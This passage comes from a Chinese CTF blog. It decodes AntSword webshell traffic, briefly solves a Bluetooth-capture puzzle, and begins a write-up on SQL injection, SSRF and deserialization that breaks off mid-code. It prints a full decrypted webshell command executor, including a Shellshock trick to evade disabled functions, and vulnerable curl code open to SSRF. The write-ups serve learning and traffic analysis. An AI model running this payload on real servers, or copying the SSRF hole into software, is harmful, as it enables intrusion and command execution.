Wg02rspbMz20brtSgsv2PhJ3gMTFg3ib7z0cQZPvcNV6DTZwSHbUO2M1uQetssYMMnBPPulwLhTkND4SzwSsgDLS6m8TxbHL0qpZRcnNo2sMy478S5DkvM=|e4qLRtta2W6ItXy3HNgpYuQuSSzpsvq+SUfoRKWM8Z5QdiBeleS/YDGP0VZqRJh3CPMC6vbegwB7qNLAt6czTsHQTdTAJBLr5g4oTDc9Sxlk8A7vvK0ljLSgKjNw5s3BDa03jINPkc5BbDkrTaXMq01Bqcu5DPTTA0pO/Z9oq1Q=|RBdZrEGknOK+PCuQ1F2eTxKvAi50XD/Z1ccAItPJ+48VlSbOTZa/wkdr82K8LE56z0E4JtZDBVSj9I4TurU2bbmfCjKXGw9xlagS7YMr/hfyCy/2hrVveAkaBZDAtmnrM4nGpFxVpzArl124XlqEzh9cSS9LAnwkNm8j05D6mDc=|aZpV5K4m1Rwxd/Y9eOfJ0bRpIZybj2tSjuAEJI7Il/EV9ZC0pXLIkgWviG40pXQFGoEwGex7f0j/Je4ldLRKnrpsyZ+/3mZtHnHL4gepf+iVaULQ8jdHTVVnM1t4qLJk+RnhYbuFjcUy5Yo6rn0Cju8sPIdpEwvi8fvetIOGVJE=|fPGROe6VaAwzqmNuk86fnWT4LqandXTwuewTC80zI8xTFSj1S6YMxPROTHS94gXlCcLTfFjEW2VpH2tyANX1FBIw5sSjsuS6CQKuqiQo6ID975H5Ox+KkJs6XLP/l5Or34U3rryHzBooTrXQlDl21qoPBLdj5URgGrEq7wrvLVA=|jp3lUm3Gz2eZpB5zghEGom2syK8nBymkc6h3pKE/mIS8KW6gD2OFSEneFERI0jy26kVOBhxr3ZHY3WoL6s5aJepTuY7D6Dpz/REI+FzR2PlCo0WvyLQdOphMgbYef1SyYr1+DWK/JxxFjxtfVRZlwL7+OyHQjQ05oVHyq6juSEI=|h8tsCCKgjChZ5U/sZxeVPiF8hO+cB6qqfeWnTAMydEcLmR0iwvHcarZw4g2WH2ASvwIN0av4GzLSu2QtOM1u0y/OuVX3v9/Vp+nNMZ/Dog0NUxFIPD1HTgaK3w7DdnA6B6i26JooWAxKlTFgYmr0x7K53pmM6B8wVQu/ADsbFBE=|CdejrTSVZhSgL+3bhPQyuL7ho71i+L8VvpwNg+D84YnKdwbbbfgqIMu+gefCBmyzvhbhEeGR16/T/fZ4bkneak+fzZpgUrejrFbOETG2Rg9zViznPwBdku9FTlWUybaRD0CHKeY7nE93/G2yXWSpuk/7P594cAPi1qd2WnEbaBc=|Hnxjy7ZSfmn6B59Kv7VXu1mhtYdgGbOtsLsLqDX6K1dKhtHsGx0guy03qwqRA0XElDdJ3Dvgqi5lgb8SY6MiDf1c9u870K8S9xVTn6Y0lbZgtvPoDrobEiT6tGEQCRsUuXB6jbUTgnNPmaDAuidQZqdsSBIGZwQyzycgxHmaDuE=|Imz1om4RRCU1Wnyowe5SYFtICyD1BODveyZ497yURKcyMgoogUxi0cPCiyexdD9ciNYk6DGyimegT7zMeIA5oGfNg2EHbzuBJeSc4wqLCJtSmTe66inu3dqC4IDxt2ghkgFLSQZWqNOKOgUt1b5wgy3O/Y3iIzS888TuFSDm+RQ=|jldlrb8EHvWiKi5E/HBIrn4UUnzMZO8+6ugZ7hjZTtWI5Vg9EeWdmITpEpOQIWIXpOUhaI+VydVcom8e7Fe6gR6u4RPy5ChmFgjZhT03gwwNXzJeiaE6x7ZZjXGBZA3Lwu5gRns3s+hTM0Tm2vrhGOQDB41hDDi4N/Yb3MRn0PM=|UJKgd4FCzzzMeQEq+w3S17+3d+g9mM3JM2qZWkWHOIF3L/EiWpRhm18DuaWJ7veqQSA5pb3KGH9rKDvj2KHIDTUHl0gCiH1U5qeD+WqXFvLahN5O8ecrfgflUUip1SdE6aL6dYqzyplxF+qy3BVr2dKq+6UYlUiA5Bmn2lXSIyM=|LClEAJBfCO7HMhlu0ASDbetkR7sP4aOx9a/P4P0L5kLeGYrlrK4Qg3ZNl7Fd/gQ8KXAKs90XRE62pfZidMX1A4xj/IokC6nkXCNUIzi0PWPWdCzcBNiswbQtsTZhElecl8RyfaOSvxsiKclTvKbZYfQI5r0p0asBs5gKnK0FpT4=|paMu+DWwNp+5GRSiGn4QfFaS/ffXXKuBgP/qzsixnnBWMeXIVy/HT23Xdoc7/OdlIH8/rBKdrJt+7o6XUAbRGzND9sEuf0Ldh5npWln/EhSkGq+bqt1hDfmwwsoo2GJcNDHBhz6lQq2M4zoa9E9d04T3N/SE+3B7LFb0cxLE8aA=|Cz+hQca9uYZJPPJusvE1G8X12VF5iPFM83nOnszF38XQziVKd+D83N4IvoJPNdJLEtgbycIpg1bo5auK1u9n2Pv8z1jFHoaTzmPgDBFiAAv3NGd0m2vg09QwRxq84PD9Ey0dwT7C1w2e6M9wGJ6DoIhPhZQgvUKMyrmCAVmMo18=|h59BqEgdFq4a1HegvdVKeMWwiwQMQsaSzYOxbNCiPuCRGknF8dHHkQboB65gnjbNBDPVpiVoDBMDV+1sCc1yM8zqC494bDS7iopf/U3BBnZS2wCxeo1x78DUiEgzP6ILomxrhrMY2y5R9IbmhJQVkpiqMhPaCvvHzOZO6Pz9SHg=|gUSFO4uVnPAI4UVTKCdBqH/rD6BZZFPfhsVOzga0ohjOJhXW+pvAu4GSh+3FIGn6cpxBUILbsLjBSgmscqAbKV/nHRnQ8HjQUgnu5YM8KikKJV35OMt1Mo1P/qlF5bwzI969XDtUHtClPkznXuO4HyvGLj0/mJj0IauhxfDKhyU=|jkhijGHqR86l+YGh7fldHrzLfam9LUYfRt2nrqqgeqCoE6KO8khatGkzLPk8QgIjLti6P6d7AwwPdVLX3gsfv6bBhT26qUR1u5+AA8foNt5tH6Ej33OODcnkxcp19eFu+zWRG1zUDkBs5qtCJvZKnpSPFKxJ6Z2g0RAoKF3pqbY=|QayQ2dVrEz8KBgpVQjGRNbpRHgFhVK3e89fEzEKzlclezrZ7CBgjB6/Y0PPYSIeZldFEZficAzHXs+bFHALEMrkJlRMk36FMuqtn0YVs4cVy8AHxjb8QnJD9gsFC6q2EWmRo8w4ZdBvg1xyeg3D0vhOcZgNk78BGoSU2HhHK5xY=|Ncgk0CAlnik6xDFINohB1EqgT7tS8COpia8O9cuvi53lNlQWY4IWG2oZMgzNWeU/m8QL+EGqhrD6IflJDD/hDO/IFC6D2DEjeMofqJ/6sHXAt2lIV129SeUUjGdrxyxeWDtqu6iBDdDBtyfPVfeI/DMYOh46XkR0Wk5nBU2N7+U=|lOxi5A2Z8sa8+aw5rQm0g6gqukXMlwvLV7ykEiGWFRqFqDaRPnkVI8diKsvgBg0Btk94gXt2FX1polSNgIJL3E6GW9loo2OMSGBBg1KJ/6VC/DpLWy44VbZhrUB//hiXo3xua6h2DRDi4h5eFkkf2ZIjGjZBi+AqHQINUbetN54=|DRBn6EF3Eoj+wpOX2xhKhkrypPB+d2+8PyHzXwKL8QmOeaRufeCZ1/7Id4TQPXiRXOYsPDXVLr1tUWAUNfqIQisGxSL8lAgg9LzYNYxRUejuTsP2WmVSO21cYXTPlNYjJDR+BkTtOlAvBBp3fjwhOVlr1khuzAhl2Y799drdSFk=|VIJ6dfEfxNcc1eWhAL0dMWXkGSCnBqv+I+Hqs7mGdK9CG3sMH1LyhIEsYg/UPccftYAPeIqKitOpj4OlNbGQMlf8AIJgFvNceAl7HCwqf/6ggZzfcBx5r4HpCBI3cB2zOOOlX9AFVRcunk3rCZSsaeQ8QGsLC1q/2EImzQqSB5g=&quot;</span>;</span><br><span class="line"><span class="variable">$pk</span> = &lt;&lt;&lt;EOF</span><br><span class="line">-----BEGIN <span class="keyword">PUBLIC</span> KEY-----</span><br><span class="line">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCmXoXBvXeanxgl51HBm2J6HPNh</span><br><span class="line">TQtfb8ICioE+n0Ni0DlBFHSBprbsWYKJywVfdhJbLDCCon68uA1UYuy0yteDog3j</span><br><span class="line">OdweW2bscEGmeMXLQJfBHpQrg4wWoYJjD3QsKorYT6kdp1LRkuHE3PbpqvRtqO7A</span><br><span class="line">LzrcBi88Eu7oZaPANwIDAQAB</span><br><span class="line">-----END <span class="keyword">PUBLIC</span> KEY-----</span><br><span class="line">EOF;</span><br><span class="line"><span class="variable">$cmds</span> = explode(<span class="string">&quot;|&quot;</span>, <span class="variable">$ant</span>);</span><br><span class="line"><span class="variable">$pk</span> = openssl_pkey_get_public(<span class="variable">$pk</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$cmds</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (openssl_public_decrypt(base64_decode(<span class="variable">$value</span>), <span class="variable">$de</span>, <span class="variable">$pk</span>)) &#123;</span><br><span class="line">    <span class="variable">$cmd</span> .= <span class="variable">$de</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">print_r(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>还原后的数据是:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);@set_time_limit(<span class="number">0</span>);<span class="function"><span class="keyword">function</span> <span class="title">asenc</span>(<span class="params"><span class="variable">$out</span></span>)</span>&#123;@session_start();<span class="variable">$key</span>=@substr(str_pad(session_id(),<span class="number">16</span>,<span class="string">&#x27;a&#x27;</span>),<span class="number">0</span>,<span class="number">16</span>);<span class="keyword">return</span> @base64_encode(openssl_encrypt(base64_encode(<span class="variable">$out</span>), <span class="string">&#x27;AES-128-ECB&#x27;</span>, <span class="variable">$key</span>, OPENSSL_RAW_DATA));&#125;;;<span class="function"><span class="keyword">function</span> <span class="title">asoutput</span>(<span class="params"></span>)</span>&#123;<span class="variable">$output</span>=ob_get_contents();ob_end_clean();<span class="keyword">echo</span> <span class="string">&quot;f3c7239848e0&quot;</span>;<span class="keyword">echo</span> @asenc(<span class="variable">$output</span>);<span class="keyword">echo</span> <span class="string">&quot;05fda2646c&quot;</span>;&#125;ob_start();<span class="keyword">try</span>&#123;<span class="variable">$p</span>=base64_decode(<span class="variable">$_POST</span>[<span class="string">&quot;t185a78b977a47&quot;</span>]);<span class="variable">$s</span>=base64_decode(<span class="variable">$_POST</span>[<span class="string">&quot;wd0b7c7ca226cb&quot;</span>]);<span class="variable">$envstr</span>=@base64_decode(<span class="variable">$_POST</span>[<span class="string">&quot;b8dcb72ce2ba93&quot;</span>]);<span class="variable">$d</span>=dirname(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);<span class="variable">$c</span>=substr(<span class="variable">$d</span>,<span class="number">0</span>,<span class="number">1</span>)==<span class="string">&quot;/&quot;</span>?<span class="string">&quot;-c \&quot;<span class="subst">&#123;$s&#125;</span>\&quot;&quot;</span>:<span class="string">&quot;/c \&quot;<span class="subst">&#123;$s&#125;</span>\&quot;&quot;</span>;<span class="keyword">if</span>(substr(<span class="variable">$d</span>,<span class="number">0</span>,<span class="number">1</span>)==<span class="string">&quot;/&quot;</span>)&#123;@putenv(<span class="string">&quot;PATH=&quot;</span>.getenv(<span class="string">&quot;PATH&quot;</span>).<span class="string">&quot;:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span>);&#125;<span class="keyword">else</span>&#123;@putenv(<span class="string">&quot;PATH=&quot;</span>.getenv(<span class="string">&quot;PATH&quot;</span>).<span class="string">&quot;;C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;&quot;</span>);&#125;<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$envstr</span>))&#123;<span class="variable">$envarr</span>=explode(<span class="string">&quot;|||asline|||&quot;</span>, <span class="variable">$envstr</span>);<span class="keyword">foreach</span>(<span class="variable">$envarr</span> <span class="keyword">as</span> <span class="variable">$v</span>) &#123;<span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$v</span>)) &#123;@putenv(str_replace(<span class="string">&quot;|||askey|||&quot;</span>, <span class="string">&quot;=&quot;</span>, <span class="variable">$v</span>));&#125;&#125;&#125;<span class="variable">$r</span>=<span class="string">&quot;<span class="subst">&#123;$p&#125;</span> <span class="subst">&#123;$c&#125;</span>&quot;</span>;<span class="function"><span class="keyword">function</span> <span class="title">fe</span>(<span class="params"><span class="variable">$f</span></span>)</span>&#123;<span class="variable">$d</span>=explode(<span class="string">&quot;,&quot;</span>,@ini_get(<span class="string">&quot;disable_functions&quot;</span>));<span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$d</span>))&#123;<span class="variable">$d</span>=<span class="keyword">array</span>();&#125;<span class="keyword">else</span>&#123;<span class="variable">$d</span>=array_map(<span class="string">&#x27;trim&#x27;</span>,array_map(<span class="string">&#x27;strtolower&#x27;</span>,<span class="variable">$d</span>));&#125;<span class="keyword">return</span>(function_exists(<span class="variable">$f</span>)&amp;&amp;is_callable(<span class="variable">$f</span>)&amp;&amp;!in_array(<span class="variable">$f</span>,<span class="variable">$d</span>));&#125;;<span class="function"><span class="keyword">function</span> <span class="title">runshellshock</span>(<span class="params"><span class="variable">$d</span>, <span class="variable">$c</span></span>) </span>&#123;<span class="keyword">if</span> (substr(<span class="variable">$d</span>, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">&quot;/&quot;</span> &amp;&amp; fe(<span class="string">&#x27;putenv&#x27;</span>) &amp;&amp; (fe(<span class="string">&#x27;error_log&#x27;</span>) || fe(<span class="string">&#x27;mail&#x27;</span>))) &#123;<span class="keyword">if</span> (strstr(readlink(<span class="string">&quot;/bin/sh&quot;</span>), <span class="string">&quot;bash&quot;</span>) != <span class="literal">FALSE</span>) &#123;<span class="variable">$tmp</span> = tempnam(sys_get_temp_dir(), <span class="string">&#x27;as&#x27;</span>);putenv(<span class="string">&quot;PHP_LOL=() &#123; x; &#125;; <span class="subst">$c</span> &gt;<span class="subst">$tmp</span> 2&gt;&amp;1&quot;</span>);<span class="keyword">if</span> (fe(<span class="string">&#x27;error_log&#x27;</span>)) &#123;error_log(<span class="string">&quot;a&quot;</span>, <span class="number">1</span>);&#125; <span class="keyword">else</span> &#123;mail(<span class="string">&quot;a@127.0.0.1&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;-bv&quot;</span>);&#125;&#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="literal">False</span>;&#125;<span class="variable">$output</span> = @file_get_contents(<span class="variable">$tmp</span>);@unlink(<span class="variable">$tmp</span>);<span class="keyword">if</span> (<span class="variable">$output</span> != <span class="string">&quot;&quot;</span>) &#123;<span class="keyword">print</span>(<span class="variable">$output</span>);<span class="keyword">return</span> <span class="literal">True</span>;&#125;&#125;<span class="keyword">return</span> <span class="literal">False</span>;&#125;;<span class="function"><span class="keyword">function</span> <span class="title">runcmd</span>(<span class="params"><span class="variable">$c</span></span>)</span>&#123;<span class="variable">$ret</span>=<span class="number">0</span>;<span class="variable">$d</span>=dirname(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);<span class="keyword">if</span>(fe(<span class="string">&#x27;system&#x27;</span>))&#123;@system(<span class="variable">$c</span>,<span class="variable">$ret</span>);&#125;<span class="keyword">elseif</span>(fe(<span class="string">&#x27;passthru&#x27;</span>))&#123;@passthru(<span class="variable">$c</span>,<span class="variable">$ret</span>);&#125;<span class="keyword">elseif</span>(fe(<span class="string">&#x27;shell_exec&#x27;</span>))&#123;<span class="keyword">print</span>(@shell_exec(<span class="variable">$c</span>));&#125;<span class="keyword">elseif</span>(fe(<span class="string">&#x27;exec&#x27;</span>))&#123;@exec(<span class="variable">$c</span>,<span class="variable">$o</span>,<span class="variable">$ret</span>);<span class="keyword">print</span>(join(<span class="string">&quot; &quot;</span>,<span class="variable">$o</span>));&#125;<span class="keyword">elseif</span>(fe(<span class="string">&#x27;popen&#x27;</span>))&#123;<span class="variable">$fp</span>=@popen(<span class="variable">$c</span>,<span class="string">&#x27;r&#x27;</span>);<span class="keyword">while</span>(!@feof(<span class="variable">$fp</span>))&#123;<span class="keyword">print</span>(@fgets(<span class="variable">$fp</span>,<span class="number">2048</span>));&#125;@pclose(<span class="variable">$fp</span>);&#125;<span class="keyword">elseif</span>(fe(<span class="string">&#x27;proc_open&#x27;</span>))&#123;<span class="variable">$p</span> = @proc_open(<span class="variable">$c</span>, <span class="keyword">array</span>(<span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;w&#x27;</span>), <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)), <span class="variable">$io</span>);<span class="keyword">while</span>(!@feof(<span class="variable">$io</span>[<span class="number">1</span>]))&#123;<span class="keyword">print</span>(@fgets(<span class="variable">$io</span>[<span class="number">1</span>],<span class="number">2048</span>));&#125;<span class="keyword">while</span>(!@feof(<span class="variable">$io</span>[<span class="number">2</span>]))&#123;<span class="keyword">print</span>(@fgets(<span class="variable">$io</span>[<span class="number">2</span>],<span class="number">2048</span>));&#125;@fclose(<span class="variable">$io</span>[<span class="number">1</span>]);@fclose(<span class="variable">$io</span>[<span class="number">2</span>]);@proc_close(<span class="variable">$p</span>);&#125;<span class="keyword">elseif</span>(fe(<span class="string">&#x27;antsystem&#x27;</span>))&#123;@antsystem(<span class="variable">$c</span>);&#125;<span class="keyword">elseif</span>(runshellshock(<span class="variable">$d</span>, <span class="variable">$c</span>)) &#123;<span class="keyword">return</span> <span class="variable">$ret</span>;&#125;<span class="keyword">elseif</span>(substr(<span class="variable">$d</span>,<span class="number">0</span>,<span class="number">1</span>)!=<span class="string">&quot;/&quot;</span> &amp;&amp; @class_exists(<span class="string">&quot;COM&quot;</span>))&#123;<span class="variable">$w</span>=<span class="keyword">new</span> COM(<span class="string">&#x27;WScript.shell&#x27;</span>);<span class="variable">$e</span>=<span class="variable">$w</span>-&gt;exec(<span class="variable">$c</span>);<span class="variable">$so</span>=<span class="variable">$e</span>-&gt;StdOut();<span class="variable">$ret</span>.=<span class="variable">$so</span>-&gt;ReadAll();<span class="variable">$se</span>=<span class="variable">$e</span>-&gt;StdErr();<span class="variable">$ret</span>.=<span class="variable">$se</span>-&gt;ReadAll();<span class="keyword">print</span>(<span class="variable">$ret</span>);&#125;<span class="keyword">else</span>&#123;<span class="variable">$ret</span> = <span class="number">127</span>;&#125;<span class="keyword">return</span> <span class="variable">$ret</span>;&#125;;<span class="variable">$ret</span>=@runcmd(<span class="variable">$r</span>.<span class="string">&quot; 2&gt;&amp;1&quot;</span>);<span class="keyword">print</span> (<span class="variable">$ret</span>!=<span class="number">0</span>)?<span class="string">&quot;ret=<span class="subst">&#123;$ret&#125;</span>&quot;</span>:<span class="string">&quot;&quot;</span>;;&#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;<span class="keyword">echo</span> <span class="string">&quot;ERROR://&quot;</span>.<span class="variable">$e</span>-&gt;getMessage();&#125;;asoutput();<span class="keyword">die</span>();</span><br></pre></td></tr></table></figure><h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>在这一串代码中可以发现有几个关键函数：asenc(),asoutput(),发现输出的内容是f3c7239848e0+asenc($output)+05fda2646c，asenc里面是用AES-128-ECB加密，key是session前16位，去包里找就行。</p><h3 id="数据还原"><a href="#数据还原" class="headerlink" title="数据还原"></a>数据还原</h3><p>接下来需要做的就是还原数据，通过代码审计可以知道base64(AES加密（base64(out)）)后的内容是+L8pc9pJEhqPQ1cmL18eJXX9QGADkKnp8A1j7s4oX2Qo8YJNGNTbuaXu+OfynYgRewqyfLj/Wrg0rgKj/cRdO4zJMmfLfyFVB4pBRYeTetM0G/w/Px6+xI/WPlRrx/+MvK6eQyPr+xDqTX82AqiGrOYDwN94/vuGcLS7NAxhty4=<br>把这个解密就行了。解密方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$res</span>=base64_decode(<span class="string">&quot;+L8pc9pJEhqPQ1cmL18eJXX9QGADkKnp8A1j7s4oX2Qo8YJNGNTbuaXu+OfynYgRewqyfLj/Wrg0rgKj/cRdO4zJMmfLfyFVB4pBRYeTetM0G/w/Px6+xI/WPlRrx/+MvK6eQyPr+xDqTX82AqiGrOYDwN94/vuGcLS7NAxhty4=&quot;</span>);</span><br><span class="line"><span class="variable">$res</span>=openssl_decrypt(<span class="variable">$payload</span>, <span class="string">&#x27;AES-128-ECB&#x27;</span>, <span class="variable">$k</span>,OPENSSL_RAW_DATA)</span><br></pre></td></tr></table></figure><p>然后再做两次base64解密就可以得到flag了。(cat flag里面的文件也是base64加密的)</p><h2 id="题目总结"><a href="#题目总结" class="headerlink" title="题目总结"></a>题目总结</h2><p>这道题有点麻烦，主要是不了解蚁剑的流量特征。在awd中shell的免杀与waf永远是在不断迭代升级的。还需要学习的姿势有很多，应该多分析流量，总结特点。</p><h2 id="蓝牙数据包"><a href="#蓝牙数据包" class="headerlink" title="蓝牙数据包"></a>蓝牙数据包</h2><p>蓝牙这道题我一开始看到没什么思路，因为没有学过蓝牙相关的协议。于是从网上现学了点，发现传输数据使用的协议，搜了搜协议名还真搜出来个.7z文件。<br>搜出来之后把这玩意十六进制导入到010editor还原成.7z，提示需要输入密码，首先考虑伪加密，发现不是（其实360会自动修复伪加密）然后看文件名提示了密码是蓝牙的PIN，<br>于是在包中搜索“PIN”。<br>第一次搜索其实我搜到了。。但是没找到PIN,刚想爆破（PIN纯数字，位数少，好爆破）的时候朋友说你搜”PIN”就行。。。我。。吐了。<br>搜到PIN之后解压文件得到flag。</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20200421学习笔记</title>
      <link href="2020/04/21/20200421%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>2020/04/21/20200421%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="今天做buuoj做了一道web题，总的来说考察到了SQL注入、SSRF、反序列化的知识点。这三个考点我都想到了，但是一块考我是没想到的。"><a href="#今天做buuoj做了一道web题，总的来说考察到了SQL注入、SSRF、反序列化的知识点。这三个考点我都想到了，但是一块考我是没想到的。" class="headerlink" title="今天做buuoj做了一道web题，总的来说考察到了SQL注入、SSRF、反序列化的知识点。这三个考点我都想到了，但是一块考我是没想到的。"></a>今天做buuoj做了一道web题，总的来说考察到了SQL注入、SSRF、反序列化的知识点。这三个考点我都想到了，但是一块考我是没想到的。</h1><p>参考链接：<br><a href="https://blog.csdn.net/weixin_43818995/article/details/104529233">https://blog.csdn.net/weixin_43818995/article/details/104529233</a><br><a href="https://blog.csdn.net/weixin_45425482/article/details/103868660">https://blog.csdn.net/weixin_45425482/article/details/103868660</a><br><a href="https://www.cnblogs.com/appleat/archive/2012/09/03/2669033.html">https://www.cnblogs.com/appleat/archive/2012/09/03/2669033.html</a><br><a href="https://www.w3school.com.cn/sql/sql_union.asp">https://www.w3school.com.cn/sql/sql_union.asp</a></p><h2 id="知识铺垫"><a href="#知识铺垫" class="headerlink" title="知识铺垫"></a>知识铺垫</h2><h3 id="MYSQL-UNION-SELECT-："><a href="#MYSQL-UNION-SELECT-：" class="headerlink" title="MYSQL UNION SELECT ："></a>MYSQL UNION SELECT ：</h3><p>比如<br>select username,password from user union select 1,2<br>UNION 结果集中的列名总是等于 UNION 中第一个 SELECT 语句中的列名。<br>可以先根据orderby判断字段个数，判断完字段个数后根据union select 1，2，3…判断在哪儿显示。<br>对union UNION 结果集中的列名总是等于 UNION 中第一个 SELECT 语句中的列名  这句话的举例：</p><img src="http://cdn.polowong.top/static/images/04211.jpg"><h3 id="MYSQL-CONCAT-GROUP-CONCAT"><a href="#MYSQL-CONCAT-GROUP-CONCAT" class="headerlink" title="MYSQL CONCAT GROUP_CONCAT"></a>MYSQL CONCAT GROUP_CONCAT</h3><p>concat(str1,’separator’,str2) // separator是分隔符<br>可以在结果中连接多个字段 比如下图举例 连接username,password为一个字段。</p><img src="http://cdn.polowong.top/static/images/04212.jpg"><p>group_concat()GROUP_CONCAT函数返回一个字符串结果，该结果由分组中的值连接组合而成。<br>简单的来说就是把查询到的数据丢到一行显示，在注入的时候就不用一个个limit了。<br>比如查表名：select group_concat(table_name) from information_schema.tables where table_Schema=数据库名 一条可以查到该数据库所有的表名</p><img src="http://cdn.polowong.top/static/images/04213.jpg"><h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><p>php的curl未经严格过滤可能导致SSRF（利用file协议。）</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>进去之后注册，注册完不知道有啥用了，打开扫描器扫一下，扫到了robots.txt<br>robots.txt提示了有个user.php的备份，下载下来。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = curl_getinfo(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span 